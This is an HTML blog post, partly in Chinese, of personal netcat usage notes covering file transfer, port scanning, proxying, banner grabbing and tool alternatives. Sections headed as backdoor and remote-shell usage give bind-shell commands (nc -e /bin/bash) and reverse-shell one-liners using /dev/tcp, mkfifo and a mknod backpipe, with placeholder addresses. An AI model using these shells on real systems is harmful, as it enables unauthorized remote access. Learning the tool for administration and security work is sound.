@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Netcat - Home</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="laggardkernel" /><meta name="description" content="netcat 个人笔记
+" /><meta name="keywords" content="netcat, network tools" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.81.0 with theme even" />
+
+
+<link rel="canonical" href="https://blog.pseudocold.com/post/2018/netcat/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.37e88f00.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Netcat" />
+<meta property="og:description" content="netcat 个人笔记" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.pseudocold.com/post/2018/netcat/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2018-11-15T22:03:21&#43;08:00" />
+<meta property="article:modified_time" content="2018-11-15T22:03:21&#43;08:00" />
+
+<meta itemprop="name" content="Netcat">
+<meta itemprop="description" content="netcat 个人笔记"><meta itemprop="datePublished" content="2018-11-15T22:03:21&#43;08:00" />
+<meta itemprop="dateModified" content="2018-11-15T22:03:21&#43;08:00" />
+<meta itemprop="wordCount" content="1296">
+<meta itemprop="keywords" content="network,netcat," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Netcat"/>
+<meta name="twitter:description" content="netcat 个人笔记"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Home</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Home</a>
+</div>
+
+<nav class="site-navbar">
+    
+      <div class="top-progress-bar"></div>
+    
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Netcat</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2018-11-15 </span>
+        <div class="post-category">
+            <a href="/categories/devops/"> DevOps </a>
+            <a href="/categories/cli/"> CLI </a>
+            <a href="/categories/notes/"> Notes </a>
+            </div>
+          <span class="more-meta"> 1296 words </span>
+          <span class="more-meta"> 3 mins read </span>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#references">References</a></li>
+    <li><a href="#usage">Usage</a>
+      <ul>
+        <li><a href="#general">General</a></li>
+        <li><a href="#wait-timeout-caveats">Wait Timeout Caveats</a></li>
+        <li><a href="#specify-interface-ip">Specify interface IP</a></li>
+        <li><a href="#port-scanning">Port Scanning</a></li>
+        <li><a href="#proxy">Proxy</a></li>
+        <li><a href="#talk-to-server">Talk to server</a></li>
+        <li><a href="#chat-room">Chat room</a></li>
+        <li><a href="#create-backdoor-on-target-system">Create backdoor on target system</a></li>
+        <li><a href="#内网穿透-remote-shell">内网穿透 Remote Shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#alternatives">Alternatives</a>
+      <ul>
+        <li><a href="#cryptcat">cryptcat</a></li>
+        <li><a href="#ncat">Ncat</a></li>
+        <li><a href="#ucspt-tcp">ucspt-tcp</a></li>
+        <li><a href="#devtcp">/dev/tcp</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <p><code>netcat</code> 个人笔记</p>
+<p>Swiss Army knife of TCP/IP tools</p>
+<ul>
+<li>send/receive TCP/UDP packets, transfering data.</li>
+<li>TCP/UDP/SCTP/SSL client</li>
+<li>Redirect or proxy TCP/UDP/SCTP traffic to other ports or hosts</li>
+<li>network gateway, execute system commands</li>
+<li>connection broker, allowing two (or far more) clients to connect to each other through a third (brokering) server.</li>
+</ul>
+<p><strong>注</strong>: <code>netcat</code> 分为 <code>openbsd-netcat</code> 和 <code>gnu-netcat</code>，某些选项不通用。使用前先翻 manual.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.youtube.com/playlist?list=PLW5y1tjAOzI1v-RQ8rAftvqKawXQR87eL">HakTip: Netcat - Network Port Scanning, File Transfers, and More!</a>
+<ul>
+<li>所有的教程都大同小异</li>
+</ul>
+</li>
+<li><code>tldr nc</code></li>
+<li><code>man nc</code></li>
+<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-netcat-swiss-army-knife-hacking-tools-0148657/">null-byte: How to Use Netcat, the Swiss Army Knife of Hacking Tools</a>
+<ul>
+<li>一般</li>
+</ul>
+</li>
+<li><a href="https://www.hackingarticles.in/comprehensive-guide-on-netcat/">Comprehensive Guide on Netcat</a>, 与上面教程内容大同小异</li>
+<li><a href="https://www.poftut.com/netcat-nc-command-tutorial-examples/">Netcat (nc) Command Tutorial With Examples</a>, 略简单</li>
+<li><a href="https://www.hempstutorials.co.uk/netcat-101/">Netcat 101</a>，大同小异</li>
+<li><a href="https://segmentfault.com/a/1190000016626298">netcat 命令详解</a></li>
+</ul>
+<h2 id="usage">Usage</h2>
+<h3 id="general">General</h3>
+<ul>
+<li><code>-u</code> to use UDP packets.</li>
+<li><code>-4</code>, <code>-6</code></li>
+<li><code>-k</code> (BSD variant only), keep nc to stay listening for another conn after current conn is completed
+<ul>
+<li>use <code>-L</code> listen harder</li>
+</ul>
+</li>
+<li><code>-n</code> disable DNS lookup</li>
+<li><code>-e</code>, gaping security option. Not enabled by default.</li>
+<li><code>-w</code>, timeout before connection setup (quit once no one connect)</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">sudo apt-get remove --purge netcat-openBSD
+sudo apt-get install netcat
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># send TCP packets</span>
+<span class="nb">echo</span> <span class="s1">&#39;&lt;YOUR MESSAGE HERE&gt;&#39;</span> <span class="p">|</span> nc &lt;HOST&gt; &lt;PORT&gt;
+
+<span class="c1"># listen to incoming packets and chat</span>
+nc -l &lt;PORT&gt;
+nc -l -p port
+nc hostname port
+
+<span class="c1"># random port with -r</span>
+nc -lv -r
+
+<span class="c1"># sending contents from files</span>
+nc localhost <span class="m">12345</span> &lt; example-netcat.txt
+<span class="c1"># receive content and save it into a file</span>
+nc -l <span class="m">12345</span> &gt; example-netcat2.txt
+
+<span class="c1"># 从listen一侧发送数据也可行</span>
+<span class="c1"># -w, --timeout.</span>
+nc -v -w <span class="m">30</span> -p <span class="m">8888</span> -l &lt; example.txt
+<span class="c1"># receive from the conn</span>
+nc -v -w <span class="m">2</span> hostname <span class="m">8888</span> &gt; output.txt
+
+<span class="c1"># 传送文件直接用重定向输入，没必要 base64</span>
+
+tar -czf - /foldername <span class="p">|</span> nc -l -p <span class="m">1337</span>
+nc 192.168.0.6 <span class="m">1337</span> <span class="p">|</span> tar -xzf -
+
+<span class="c1"># use pv to track progress</span>
+<span class="c1"># https://www.tecmint.com/transfer-files-between-two-linux-machines/</span>
+tar -zcf - CentOS-7-x86_64-DVD-1503.iso <span class="p">|</span> pv <span class="p">|</span> nc -l -p <span class="m">5555</span> -q <span class="m">5</span>
+<span class="c1"># -q, BSD only</span>
+<span class="c1"># -q 5, wait 5s and quit</span>
+nc 192.168.1.4 <span class="m">5555</span> <span class="p">|</span> pv <span class="p">|</span> tar -zxf -
+
+<span class="c1"># record with better readability/verbosity</span>
+nc hostname port -v -o ./output.txt
+
+<span class="c1"># listen on a Unix socket</span>
+nc -lU /var/tmp/test.sock
+<span class="c1"># connect to a socket and input things</span>
+nc -U /var/tmp/test.sock
+
+<span class="c1"># custom timeout</span>
+nc -w timeout_in_seconds ipaddress port
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="wait-timeout-caveats">Wait Timeout Caveats</h3>
+<p><code>-w</code> in <code>openbsd-netcat</code> has no effect on <code>-l</code> listen option. <code>nc</code> will <em>listen forever</em> for a connection, with or without the <code>-w</code> flag. This may not apply on <code>gnu-netcat</code>.</p>
+<h3 id="specify-interface-ip">Specify interface IP</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># -s, use interface with ip 10.x to send packets</span>
+nc -s 10.1.2.3 host.example.com <span class="m">42</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="port-scanning">Port Scanning</h3>
+<p><code>-z</code> does port scanning, TCP by defaults. Use <code>-uz</code> to make UDP scanning.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># -z , scan for listening daemons, without sending any data  connections.</span>
+nc -z &lt;HOST&gt; &lt;PORT Range&gt;
+<span class="c1"># -v, verbose</span>
+
+nc -v -n -z -w <span class="m">2</span> hostname 21-1100
+<span class="c1"># -w, timeout 2s</span>
+<span class="c1"># -n, numeric-only IP addresses</span>
+
+<span class="c1"># delayed scan, 扫描一次的等待时间</span>
+<span class="c1"># -i, delay time interval between lines of text sent and received</span>
+nc -z -v -i <span class="m">10</span> hostname 21-80
+
+<span class="c1"># udp scan</span>
+nc -vzu hostname 80-90
+
+$ <span class="nb">echo</span> <span class="s2">&#34;QUIT&#34;</span> <span class="p">|</span> nc host.example.com 20-30
+SSH-1.99-OpenSSH_3.6.1p2
+Protocol mismatch.
+<span class="m">220</span> host.example.com IMS SMTP Receiver Version 0.84 Ready
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="proxy">Proxy</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># forward data from a local TCP port to the given remote host</span>
+nc -l local_port <span class="p">|</span> nc hostname remote-port
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="talk-to-server">Talk to server</h3>
+<ul>
+<li>grab banner, header</li>
+<li>redirect traffic</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">nc hostname port <span class="c1"># -v,</span>
+
+<span class="nb">echo</span> -n <span class="s2">&#34;GET / HTTP/1.0\r\n\r\n&#34;</span> <span class="p">|</span> nc host.example.com <span class="m">80</span>
+
+nc localhost <span class="m">25</span> <span class="s">&lt;&lt; EOF
+</span><span class="s">HELO host.example.com
+</span><span class="s">MAIL FROM: &lt;user@host.example.com&gt;
+</span><span class="s">RCPT TO: &lt;user2@host.example.com&gt;
+</span><span class="s">DATA
+</span><span class="s">Body of email.
+</span><span class="s">.
+</span><span class="s">QUIT
+</span><span class="s">EOF</span>
+
+nc -l -p <span class="m">1337</span> <span class="p">|</span> nc http://www.google.com <span class="m">80</span>
+<span class="c1"># pipe input into 1337, pipe output from google back to 1338</span>
+nc -l -p <span class="m">1337</span> <span class="p">|</span> nc https://www.google.com <span class="m">443</span> <span class="p">|</span> nc -l -p <span class="m">1338</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="chat-room">Chat room</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">nc -l -vv -p <span class="m">4444</span>
+<span class="c1"># -l, listen</span>
+<span class="c1"># -vv, verbose</span>
+
+<span class="c1"># other machine</span>
+nc initiator-server <span class="m">4444</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="create-backdoor-on-target-system">Create backdoor on target system</h3>
+<p><code>-e</code>, pipe the Linux bash shell to the connecting system</p>
+<ul>
+<li>可能默认被移除</li>
+<li>open a non-login, non-interactive <code>$TERM</code> dumb</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># setup a server/listener, and pass input into shell</span>
+nc -l -p <span class="m">6996</span> -e /bin/bash
+nc -l -p <span class="m">6996</span> -e <span class="s2">&#34;/usr/local/bin/bash -il&#34;</span>
+
+<span class="c1"># or run a script</span>
+nc -l -p <span class="m">1334</span> -e ./script.bash
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="内网穿透-remote-shell">内网穿透 Remote Shell</h3>
+<blockquote>
+<p><code>-t</code></p>
+<p>Send RFC 854 DON&rsquo;T and WON&rsquo;T responses to RFC 854 DO and WILL requests.  This makes it possible to use nc to script telnet sessions.</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># outside firewall</span>
+nc -l <span class="m">9000</span>
+
+<span class="c1"># inside firewall</span>
+nc -t address <span class="m">9000</span> <span class="p">|</span> /bin/bash
+
+<span class="c1"># pipe back output</span>
+mkfifo ncpipe
+nc -t address <span class="m">9000</span> <span class="m">0</span> &lt; ncpipe <span class="p">|</span> /bin/bash <span class="m">1</span> &gt; ncpipe
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="alternatives">Alternatives</h2>
+<h3 id="cryptcat">cryptcat</h3>
+<p><code>cryptcat</code>, netcat using two-fish encryption.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># encrypt connection with password</span>
+cryptcat -k password-string -l -p <span class="m">1337</span>
+
+cryptcat -k password hostname <span class="m">1337</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="ncat">Ncat</h3>
+<p><code>ncat</code> comes with <code>nmap</code>, with proxy, ssl encryption support.</p>
+<ul>
+<li><a href="https://nmap.org/ncat/guide/">Ncat guide</a></li>
+<li><a href="https://www.youtube.com/watch?v=0JFM3PRZH-k">Advanced Netcat and TCP Fun - Hak5 1922</a></li>
+<li>examples at <code>man ncat</code></li>
+</ul>
+<p>Exclusive options</p>
+<ul>
+<li><code>-k</code>, not available on GNU netcat, but available on BSD netcat. 保持端口开启，继续监听下一个连接。</li>
+<li><code>-m</code>, maximum conn</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># 多人聊天</span>
+ncat -l -p <span class="m">1337</span> -m <span class="m">40</span> -k --chat
+<span class="c1"># -m, max conn</span>
+<span class="c1"># -k, keep open even all disconnect</span>
+<span class="c1"># --chat, chat mode, prefixes each msg with an ID and relay it to other client</span>
+<span class="c1"># chat mode下，服务器本身不显示文件</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="ucspt-tcp">ucspt-tcp</h3>
+<p><code>tcpcat</code>, <code>tcpserver</code>, <code>tcpclient</code></p>
+<ul>
+<li><a href="https://www.youtube.com/watch?v=0JFM3PRZH-k">Advanced Netcat and TCP Fun - Hak5 1922</a></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># server side</span>
+tcpserver -v -RHl0 <span class="m">0</span> <span class="m">1337</span> ./test.sh
+<span class="c1"># -R, no remote info</span>
+<span class="c1"># -H, no remote hostname lookup</span>
+<span class="c1"># -l0, no local hostname lookup, use 0 for it</span>
+<span class="c1"># 0, bind for all interfaces</span>
+<span class="c1"># 后接文件，而不能 &#34;bash -il&#34;, bash -il</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="devtcp">/dev/tcp</h3>
+<p>without ncat or netcat, use tcp device to create client to send and receive packets.</p>
+<ul>
+<li><code>/dev/tcp</code></li>
+</ul>
+<p><strong>Note</strong>: <code>telnet</code> is not available on macOS</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># bind descriptor with a hostname, in and out</span>
+<span class="nb">exec</span> <span class="m">3</span> &lt;&gt; /dev/tcp/127.0.0.1/1337
+<span class="nb">echo</span> -e <span class="s2">&#34;Hello Snubs\r\n&#34;</span> &gt;<span class="p">&amp;</span><span class="m">3</span>
+
+<span class="c1"># receive packet with</span>
+cat &lt;<span class="p">&amp;</span><span class="m">3</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><a href="https://www.youtube.com/watch?v=hZ6TjWuepqw&amp;t=0s">netcat without netcat</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">nc -l -p <span class="m">1337</span> -k -vv
+
+<span class="c1"># 客户端：把bash stdout, stderr导回tcp设备</span>
+<span class="c1"># 实际为创建服务端，共享shell</span>
+bash -i &gt; /dev/tcp/ip_address/port 0&lt;<span class="p">&amp;</span><span class="m">1</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+
+<span class="c1"># mknod, make a device specific file</span>
+mknod backpipe p <span class="o">&amp;&amp;</span> telnet ip_address port 0&lt;backpipe <span class="p">|</span> bash 1&gt;backpipe
+</code></pre></td></tr></table>
+</div>
+</div>
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">laggardkernel</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2018-11-15
+        
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">License</span>
+    <span class="item-content"><a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></span>
+  </p>
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/network/">network</a>
+          <a href="/tags/netcat/">netcat</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/2018/iproute2/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">iproute2 Usage</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/2018/hidden-fonts-on-macos/">
+            <span class="next-text nav-default">macOS 中的隐藏字体</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'pseudocold';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://stackoverflow.com/users/5101148" class="iconfont icon-stack-overflow" title="stack-overflow"></a>
+      <a href="https://github.com/laggardkernel" class="iconfont icon-github" title="github"></a>
+  <a href="https://blog.pseudocold.com/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2017 - 
+    2021
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">laggardkernel</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.46a59934.min.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
